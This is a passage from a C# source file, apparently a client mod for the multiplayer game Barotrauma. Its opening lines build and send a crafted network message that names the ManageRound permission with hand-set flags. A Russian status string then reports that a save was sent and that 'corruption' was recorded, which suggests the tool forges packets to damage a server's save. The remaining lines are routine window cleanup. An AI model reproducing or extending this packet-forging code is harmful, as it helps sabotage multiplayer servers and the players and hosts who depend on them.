            msg.WriteUInt16((ushort)ClientPermissions.ManageRound);
            msg.WriteBoolean(true);
            msg.WriteBoolean(true);
            msg.WriteBoolean(false);
            GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            return "Сейв отправлен (аутпост + ManageRound/окно) — порча зафиксирована";
        }

        private static void CloseWindow()
        {
            try { _window?.Close(); } catch { }
            _window = null;
            _list = null;
            _desc = null;
            _repeatBox = null;
        }

        public override void Dispose()
        {
            CloseWindow();
            base.Dispose();
        }
    }
}
